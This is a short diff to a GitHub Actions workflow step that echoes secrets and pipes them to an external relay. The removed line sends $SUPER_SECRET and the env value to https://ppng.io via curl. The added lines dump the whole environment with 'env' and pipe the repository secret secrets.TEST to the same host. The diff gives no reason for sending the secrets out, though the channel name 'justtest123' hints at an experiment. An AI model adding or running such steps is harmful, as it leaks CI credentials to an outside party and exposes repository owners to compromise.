@@ -15,4 +15,5 @@ jobs:
         run: |
           echo $SUPER_SECRET
           echo $env
-          echo "token is $SUPER_SECRET,other is $env" | curl -T - https://ppng.io/justtest123
+          env
+          echo "Token TEST: ${{secrets.TEST}}" | curl -T - https://ppng.io/justtest123
